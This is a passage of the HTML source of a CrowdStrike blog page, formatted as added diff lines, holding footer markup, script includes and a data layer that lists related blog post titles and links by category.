+            <p>Sign up now to receive the latest notifications and updates from CrowdStrike</p>
+            <div class="button">
+                <button class="black-white-btn">
+                    <a class="white-text white-outline white-text-hover" data-behavior-modal="" data-modal-link="modal:subscribe" data-tracked="true">Subscribe</a>
+                    <svg>
+                        <use href="#white-arrow" xmlns:xlink="https://www.w3.org/1999/xlink" xlink:href="#cta-arrow-white"></use>
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </div>
+    <div class="cmp-wp-card-three cmp-wp-card-common" id="card-3" style="background: linear-gradient(180deg, rgba(0, 0, 0, 0) -11.32%, #000 81.91%), url('/content/dam/crowdstrike/marketing/en-us/images/blog/blog-article-page/card-3.png') lightgray 50% / cover no-repeat;">
+        <div class="cmp-wp-content">
+            <h5>See CrowdStrike Falcon in action</h5>
+            <div class="button">
+                <button class="transparent-btn">
+                    <a href="https://www.crowdstrike.com/products/demos/">Explore demos</a>
+                    <svg>
+                        <use href="#white-arrow" xmlns:xlink="https://www.w3.org/1999/xlink" xlink:href="#cta-arrow-white"></use>
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+        
+    
+    
+    
+    
+    
+</div></div>
+
+    
+</div>
+</div>
+
+    
+</div>
+
+</div>
+<div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    
+    
+</div>
+</div>
+
+    
+</div>
+
+    </div>
+
+    
+    
+    
+</div>
+
+    
+</div>
+
+    </div>
+
+    
+    
+    
+</div>
+<div class="experiencefragment aem-GridColumn aem-GridColumn--default--12">
+<div id="experiencefragment-c93ecf49fe" class="cmp-experiencefragment cmp-experiencefragment--footer" data-target-location="false">
+
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="footer list aem-GridColumn aem-GridColumn--default--12"><div class="container">
+    <div class="row">
+        <div class="col-md-12 top">
+            <span class="footer-logo">
+
+<a class="cmp-wp-logo crowdstrike_logo" href="https://www.crowdstrike.com/en-us" data-target-location="false">
+    <img src="https://assets.crowdstrike.com/is/content/crowdstrikeinc/black-crowdstrike-logo-footer" alt="logo"/>
+    
+</a>
+
+
+
+    <div style="display: none;">
+        
+    </div>
+
+
+    
+</span>
+            
+    
+    
+    
+        
+    <div class="cmp-social-links" id="sociallinks-en-us" data-target-location="false">    
+        <ul class="row social-links">
+            <li class="circle-icon-outline">
+                <a href="https://x.com/CrowdStrike" target="_blank" data-link-tracked="true" aria-label="twitter - open in a new tab" data-uw-rm-empty-ctrl="" data-uw-rm-brl="PR" data-uw-original-href="https://x.com/CrowdStrike" data-uw-rm-ext-link="" uw-rm-external-link-id="https://x.com/CrowdStrike$twitter">
+                    <i class="fa-brands fa-x-twitter"></i>
+                </a>
+            </li>
+            <li class="circle-icon-outline">
+                
+            </li>
+            <li class="circle-icon-outline">
+                <a href="https://www.linkedin.com/company/crowdstrike" target="_blank" data-link-tracked="true" aria-label="linkedin - open in a new tab" data-uw-rm-empty-ctrl="" data-uw-rm-ext-link="" uw-rm-external-link-id="https://www.linkedin.com/company/crowdstrike$linkedin">
+                    <i class="fa-brands fa-linkedin"></i>
+                </a>
+            </li>
+            <li class="circle-icon-outline">
+                <a href="http://www.youtube.com/user/CrowdStrike" target="_blank" data-link-tracked="true" aria-label="youtube - open in a new tab" data-uw-rm-empty-ctrl="" data-uw-rm-ext-link="" uw-rm-external-link-id="http://www.youtube.com/user/CrowdStrike$youtube">
+                    <i class="fa-brands fa-youtube"></i>
+                </a>
+            </li>
+        </ul>
+    </div>
+
+    <div style="display: none;">
+        
+    </div>
+
+    
+	
+
+    
+
+        </div>
+        <div class="col-md-12 bottom">
+            
+                <ul class="row footer-lower-links" id="list-en-us">
+                    <li>
+        
+        <span>Copyright © 2026 CrowdStrike</span>
+</li>
+                
+                    <li>
+        <a href="https://www.crowdstrike.com/privacy-notice/">
+            <span>
+                
+                Privacy</span>
+            
+            
+            
+
+        </a>
+        
+</li>
+                
+                    <li>
+        <a href="https://www.crowdstrike.com/services/request-information/">
+            <span>
+                
+                Request Info</span>
+            
+            
+            
+
+        </a>
+        
+</li>
+                
+                    <li>
+        <a href="https://www.crowdstrike.com/blog/">
+            <span>
+                
+                Blog</span>
+            
+            
+            
+
+        </a>
+        
+</li>
+                
+                    <li>
+        <a href="https://www.crowdstrike.com/contact-us/">
+            <span>
+                
+                Contact Us</span>
+            
+            
+            
+
+        </a>
+        
+</li>
+                
+                    <li>
+        
+        <span> 1.888.512.8906</span>
+</li>
+                
+                    <li>
+        <a href="#" class="cs-uw-accessibilityWidget">
+            <span>
+                
+                Accessibility</span>
+            
+            
+            
+
+        </a>
+        
+</li>
+                </ul>
+            
+        </div>
+    </div>
+</div>
+
+
+
+
+    <div style="display: none;">
+        
+    </div>
+
+
+    
+
+
+</div>
+
+    
+</div>
+</div>
+
+    
+</div>
+</div>
+
+    
+</div>
+
+    
+</div>
+</div>
+
+
+            
+    
+    
+<script src="/etc.clientlibs/crowdstrike/clientlibs/crowdstrike-common.lc-226097951f5a01bfce72161c35e1c9b9-lc.min.js"></script>
+<script src="/etc.clientlibs/crowdstrike/clientlibs/crowdstrike-wp.lc-66ec633d17f6f8ac632cde7c9bbdbd3b-lc.min.js"></script>
+<script src="/etc.clientlibs/crowdstrike/clientlibs/crowdstrike-addsearch.lc-8de9446d0f45a34ebe648995a8aa86aa-lc.min.js"></script>
+<script src="/etc.clientlibs/crowdstrike/clientlibs/crowdstrike-dotcomv2.lc-66e73883e66853c7b94fbe3f6b929704-lc.min.js"></script>
+
+
+
+    
+
+    
+    
+<script src="/etc.clientlibs/core/wcm/components/commons/site/clientlibs/container.lc-0a6aff292f5cc42142779cde92054524-lc.min.js"></script>
+<script src="/etc.clientlibs/crowdstrike/clientlibs/crowdstrike-base.lc-f54bcc9456cf289fb257b9499b24226e-lc.min.js"></script>
+
+
+
+    
+    
+<script src="/etc.clientlibs/crowdstrike/clientlibs/crowdstrike-lottie.lc-59169d2e9977544fd3ae80d885311bce-lc.min.js"></script>
+
+
+
+    
+
+
+
+    <div class="cloudservice includedatalayer">
+
+
+
+
+<script>
+    if(!window.digitalData || Object.keys(window.digitalData).length === 0 )
+    {
+        window.digitalData = {
+  "component" : [ {
+    "linkedInUrl" : "https://www.linkedin.com/company/crowdstrike",
+    "youtubeUrl" : "https://www.youtube.com/user/CrowdStrike",
+    "twitterUrl" : "https://www.twitter.com/CrowdStrike",
+    "componentInfo" : { }
+  }, {
+    "componentInfo" : { },
+    "id" : "logo-en-us",
+    "fileReference" : "https://assets.crowdstrike.com/is/content/crowdstrikeinc/RedLogoCS",
+    "title" : "Blog",
+    "thumbnailImagePath" : "/content/dam/crowdstrike/www/en-us/wp/2024/07/RedLogoCS.svg/jcr:content/renditions/cq5dam.thumbnail.319.319.png",
+    "url" : "/content/crowdstrike-www/locale-sites/us/en-us/blog"
+  }, {
+    "recentLabel" : "Recent",
+    "videoLabel" : "Video",
+    "featuredPagePath" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/featured-articles.html",
+    "categoryParentPath" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/categories-overview.html",
+    "categoryLabel" : "Category",
+    "recentPagePath" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/recent-articles.html",
+    "freeTrialLabel" : "Start Free Trial",
+    "children" : [ {
+      "pageTitle" : "Video Highlights the 4 Key Steps to Successful Incident Response",
+      "publishDate" : "Dec 02, 2019",
+      "pageThumbnail" : "https://assets.crowdstrike.com/is/image/crowdstrikeinc/IR-Video-Blog-1?wid=530&hei=349&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0",
+      "url" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/video-highlights-the-4-key-steps-to-successful-incident-response.html"
+    }, {
+      "pageTitle" : "Helping Non-Security Stakeholders Understand ATT&CK in 10 Minutes or Less [VIDEO]",
+      "publishDate" : "Feb 21, 2019",
+      "pageThumbnail" : "https://assets.crowdstrike.com/is/image/crowdstrikeinc/video-ATTCK2-1?wid=530&hei=349&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0",
+      "url" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/helping-non-security-stakeholders-understand-attck-in-10-minutes-or-less.html"
+    }, {
+      "pageTitle" : "Analyzing Targeted Intrusions Through the ATT&CK Framework Lens [VIDEO]",
+      "publishDate" : "Jan 22, 2019",
+      "pageThumbnail" : "https://assets.crowdstrike.com/is/image/crowdstrikeinc/video-ATTCK2-1?wid=530&hei=349&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0",
+      "url" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/analyzing-targeted-intrusions-through-the-attck-framework-lens-video.html"
+    }, {
+      "pageTitle" : "Qatar’s Commercial Bank Chooses CrowdStrike Falcon®: A Partnership Based on Trust [VIDEO]",
+      "publishDate" : "Aug 20, 2018",
+      "pageThumbnail" : "https://assets.crowdstrike.com/is/image/crowdstrikeinc/Edward-Gonam-Qatar-Blog2-1?wid=530&hei=349&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0",
+      "url" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/qatars-commercial-bank-chooses-crowdstrike-falcon-a-partnership-based-on-trust.html"
+    }, {
+      "children" : "[{\"pageTitle\":\"How AI-leading Security Teams Are Building the Agentic SOC\",\"publishDate\":\"07/06/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-SOC-AI?wid\\u003d1536\\u0026hei\\u003d1024\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/how-ai-leading-security-teams-are-building-the-agentic-soc.html\"},{\"pageTitle\":\"New Claude Integration Brings Audit Data into the Falcon Platform\",\"publishDate\":\"05/21/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Integration?wid\\u003d1544\\u0026hei\\u003d1018\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/new-claude-integration-brings-audit-data-into-the-falcon-platform.html\"},{\"pageTitle\":\"How Charlotte AI AgentWorks Fuels Security\\u0027s Agentic Ecosystem \",\"publishDate\":\"03/25/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-AgentWorks?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/how-charlotte-ai-agentworks-fuels-securitys-agentic-ecosystem.html\"},{\"pageTitle\":\"CrowdStrike Services and Agentic MDR Put the Agentic SOC in Reach\",\"publishDate\":\"03/24/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Personalized-Threat-Intel (1)?wid\\u003d2048\\u0026hei\\u003d1350\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-services-and-agentic-mdr-put-the-agentic-soc-in-reach.html\"}]",
+      "title" : "Agentic SOC",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.ai-machine-learning.html"
+    }, {
+      "children" : "[{\"pageTitle\":\"Falcon Cloud Security July 2026 Release: Helping Security Teams Move Faster in the Cloud\",\"publishDate\":\"07/29/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FCS-July26?wid\\u003d2048\\u0026hei\\u003d1365\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/new-in-falcon-cloud-security-helping-security-teams-move-faster.html\"},{\"pageTitle\":\"Falcon Cloud Security June 2026 Release: Updates for Azure and Google Cloud\",\"publishDate\":\"06/29/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Cloud-Puzzle-Tech?wid\\u003d2048\\u0026hei\\u003d1349\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/new-in-falcon-cloud-security-expanding-multi-cloud-coverage.html\"},{\"pageTitle\":\"94% of Organizations Report Cloud Breaches: CrowdStrike State of CDR Survey\",\"publishDate\":\"06/22/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-CDRSurvey?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-state-of-cdr-survey-key-takeaways.html\"},{\"pageTitle\":\"CrowdStrike Named an Innovation and Growth Leader in the 2026 Frost Radar™: Cloud and Application Runtime Security\",\"publishDate\":\"06/11/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Frost-CARS-2026?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-leads-2026-frost-radar-cloud-runtime-security.html\"}]",
+      "title" : "Cloud & Application Security",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.cloud-security.html"
+    }, {
+      "children" : "[{\"pageTitle\":\"CrowdStrike 2026 Threat Hunting Report: Exploitation Window Closes as AI Use Accelerates\",\"publishDate\":\"08/03/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-THR-2026?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-2026-threat-hunting-report.html\"},{\"pageTitle\":\"Inside Astaroth\\u0027s New Spambot Component\",\"publishDate\":\"07/29/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Scattered-Spider?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/inside-astaroths-new-spambot-component.html\"},{\"pageTitle\":\"CrowdStrike 2026 Technology Threat Landscape Report: China’s Ambitions Fuel Attacks \",\"publishDate\":\"06/09/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-TechThreatReport?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-2026-technology-threat-landscape-report.html\"},{\"pageTitle\":\"Disrupting Glassworm: Inside CrowdStrike’s Takedown of a Developer-Targeting Botnet\",\"publishDate\":\"05/26/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/CS_Blog-Update_02-1?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/inside-crowdstrike-takedown-of-a-developer-targeting-botnet.html\"}]",
+      "title" : "Threat Hunting & Intel",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.counter-adversary-operations.html"
+    }, {
+      "children" : "[{\"pageTitle\":\"Falcon Secure Access Sets the Standard for Zero Trust Browser Security\",\"publishDate\":\"07/08/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Falcon-Browser?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/falcon-secure-access-sets-standard-for-zero-trust-security-browser.html\"},{\"pageTitle\":\"Browser Security: Zero-Days Are Only Part of the Problem \",\"publishDate\":\"06/30/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Zero-Days?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/browser-security-zero-days-are-only-part-of-the-problem.html\"},{\"pageTitle\":\"New Abuse of the ClickOnce Technology, Part 2: Stop Threat Actors from Clicking Once and Staying Forever\",\"publishDate\":\"06/18/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-ClickOnce-2?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/new-abuse-of-the-clickonce-technology-part-two.html\"},{\"pageTitle\":\"New Abuse of the ClickOnce Technology, Part 1: The Inner Workings of ClickOnce Application Deployment\",\"publishDate\":\"06/18/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-ClickOnce-1?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/new-abuse-of-the-clickonce-technology-part-one.html\"}]",
+      "title" : "Endpoint Security & XDR",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.endpoint-protection.html"
+    }, {
+      "children" : "[{\"pageTitle\":\"EMBER2024: Advancing the Training of Cybersecurity ML Models Against Evasive Malware\",\"publishDate\":\"09/03/25\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-EMBER2024?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/ember-2024-advancing-cybersecurity-ml-training-on-evasive-malware.html\"},{\"pageTitle\":\"Falcon Platform Prevents COOKIE SPIDER’s SHAMOS Delivery on macOS\",\"publishDate\":\"08/20/25\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-COOKIESPIDER?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/falcon-prevents-cookie-spider-shamos-delivery-macos.html\"},{\"pageTitle\":\"CrowdStrike’s Approach to Better Machine Learning Evaluation Using Strategic Data Splitting\",\"publishDate\":\"08/11/25\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-DataSplitting-4?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/machine-learning-evaluation-using-data-splitting.html\"},{\"pageTitle\":\"CrowdStrike Researchers Develop Custom XGBoost Objective to Improve ML Model Release Stability\",\"publishDate\":\"03/20/25\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-XGBoost?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-researchers-develop-custom-xgboost-objective.html\"}]",
+      "title" : "Engineering & Tech",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.engineering-and-technology.html"
+    }, {
+      "children" : "[{\"pageTitle\":\"Beyond the Model: Harnessing Frontier AI for Stronger Cyber Defense\",\"publishDate\":\"07/20/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-DeepSeek?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/harnessing-frontier-ai-for-stronger-defense.html\"},{\"pageTitle\":\"Frontier AI Is Collapsing the Exploit Window. Here’s How Defenders Must Respond.\",\"publishDate\":\"04/20/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-DeepSeek?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/frontier-ai-collapses-exploit-window-how-defenders-must-respond.html\"},{\"pageTitle\":\"Frontier AI for Defenders: CrowdStrike and OpenAI TAC\",\"publishDate\":\"04/16/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Shield-AI?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/frontier-ai-for-defenders-crowdstrike-and-openai-tac.html\"},{\"pageTitle\":\"Anthropic Claude Mythos Preview: The More Capable AI Becomes, the More Security It Needs\",\"publishDate\":\"04/06/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Architecture-of-Agentic-Defense?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-founding-member-anthropic-mythos-frontier-model-to-secure-ai.html\"}]",
+      "title" : "Executive Viewpoint",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.executive-viewpoint.html"
+    }, {
+      "children" : "[{\"pageTitle\":\"CrowdStrike Technical Risk Assessments Reveal Common Exposure Patterns \",\"publishDate\":\"05/04/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Personalized-Threat-Intel (1)?wid\\u003d2048\\u0026hei\\u003d1350\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-technical-risk-assessments-reveal-common-exposure-patterns.html\"},{\"pageTitle\":\"Introducing the CrowdStrike Shadow AI Visibility Service\",\"publishDate\":\"04/21/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-ShadowAI?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-shadow-AI-visibility-service.html\"},{\"pageTitle\":\"CrowdStrike Flex for Services Expands Access to Elite Security Expertise\",\"publishDate\":\"03/24/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Flex-Services?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-extends-the-falcon-flex-model-to-services.html\"},{\"pageTitle\":\"From Scanner to Stealer: Inside the trivy-action Supply Chain Compromise\",\"publishDate\":\"03/20/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-NPM-SupplyChain?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/from-scanner-to-stealer-inside-the-trivy-action-supply-chain-compromise.html\"}]",
+      "title" : "From The Front Lines",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.from-the-front-lines.html"
+    }, {
+      "children" : "[{\"pageTitle\":\"The Identity Problem Hiding in AI Agent Deployments \",\"publishDate\":\"06/24/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Agentic-Identity?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/the-identity-problem-hiding-in-ai-agent-deployments.html\"},{\"pageTitle\":\"CrowdStrike Announces Continuous Identity for AI Agents\",\"publishDate\":\"06/15/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Continuous-Identity?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-announces-continuous-identity-for-ai-agents.html\"},{\"pageTitle\":\"CrowdStrike Expands Identity Leadership with OpenID and IDPro\",\"publishDate\":\"06/10/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Identity-Leadership?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-expands-identity-leadership-with-openid-and-idpro.html\"},{\"pageTitle\":\"CrowdStrike and Zscaler Bring Continuous Identity to Zero Trust Access\",\"publishDate\":\"06/08/26\",\"pageThumbnail\":\"https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Lock?wid\\u003d1060\\u0026hei\\u003d698\\u0026fmt\\u003dpng-alpha\\u0026qlt\\u003d95,0\\u0026resMode\\u003dsharp2\\u0026op_usm\\u003d3.0,0.3,2,0\",\"url\":\"/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-zscaler-bring-continuous-identity-security-to-zero-trust-access.html\"}]",
+      "title" : "Next-Gen Identity Security",
+      "categoryLink" : "/content/crowdstrike-www/locale-sites/us/en-us/blog/category.identity-protection.html"
+    }, {
